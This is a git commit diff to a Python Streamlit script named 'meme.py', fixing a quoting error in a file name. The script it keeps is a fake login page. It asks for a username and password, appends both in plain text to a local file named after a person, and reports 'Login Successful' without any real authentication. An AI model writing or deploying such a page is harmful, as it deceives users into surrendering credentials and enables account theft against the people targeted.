beab864a9eef2ca6d3b5ec428c55d30e961f89f1
Sree <Skarmoney99@gmail.com>
2024-06-28 09:20:35 -0500

    Update meme.py

--- meme.py
+++ meme.py
@@ -6,7 +6,7 @@ username = st.text_input('Username')
 password = st.text_input('Password', type='password')
 
 if st.button('Login'):
-    with open('aarnav'\s fort password', 'a') as file:
+    with open('aarnav fort password', 'a') as file:
         file.write(f'Username: {username}, Password: {password}\n')
     
     st.write('Login Successful')
